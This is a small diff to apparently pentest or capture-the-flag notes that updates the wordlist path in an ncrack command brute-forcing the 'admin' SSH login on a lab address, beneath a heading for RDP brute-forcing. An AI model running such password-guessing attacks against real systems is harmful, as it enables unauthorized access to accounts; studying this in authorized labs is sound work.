@@ -17,7 +17,7 @@
 ### Bruteforce SSH
 
 ```bash
-ncrack -u admin -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt ssh://10.10.11.42
+ncrack -u admin -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt ssh://10.10.11.42
 ```
 
 ### Bruteforce RDP
